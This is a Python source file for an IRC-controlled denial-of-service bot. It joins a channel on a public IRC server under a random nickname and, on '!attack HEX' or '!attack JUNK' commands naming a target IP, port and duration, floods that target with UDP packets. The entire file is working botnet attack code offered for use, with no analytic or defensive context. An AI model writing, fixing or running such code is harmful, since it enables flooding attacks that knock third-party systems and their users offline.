import irc.bot
import irc.strings
import socket
import time
import random
import string

class SimpleBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, server, port=6667):
        nickname = self.generate_random_nickname()
        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
        self.channel = channel

    def generate_random_nickname(self):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))

    def on_welcome(self, connection, event):
        connection.join(self.channel)

    def on_pubmsg(self, connection, event):
        message = event.arguments[0]  # Fix here: remove ()
        sender = event.source.nick

        if message.startswith("!attack HEX"):
            params = message.split()
            if len(params) == 5:
                ip = params[2]
                port = int(params[3])
                duration = int(params[4])
                self.attack_hex(ip, port, duration)
            else:
                connection.privmsg(self.channel, "Usage: !attack HEX <ip> <port> <duration>")
        
        elif message.startswith("!attack JUNK"):
            params = message.split()
            if len(params) == 5:
                ip = params[2]
                port = int(params[3])
                duration = int(params[4])
                self.attack_junk(ip, port, duration)
            else:
                connection.privmsg(self.channel, "Usage: !attack JUNK <ip> <port> <duration>")

    def attack_hex(self, ip, port, duration):
        end_time = time.time() + duration
        payload = '\x55\x55\x55\x55\x00\x00\x00\x01'
        while time.time() < end_time:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.close()

    def attack_junk(self, ip, port, duration):
        end_time = time.time() + duration
        payload = '\x00' * 64
        while time.time() < end_time:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.close()

if __name__ == "__main__":
    CHANNEL = "#anontoken"
    SERVER = "irc.freenode.net"
    PORT = 6667
    
    bot = SimpleBot(CHANNEL, SERVER, PORT)
    bot.start()
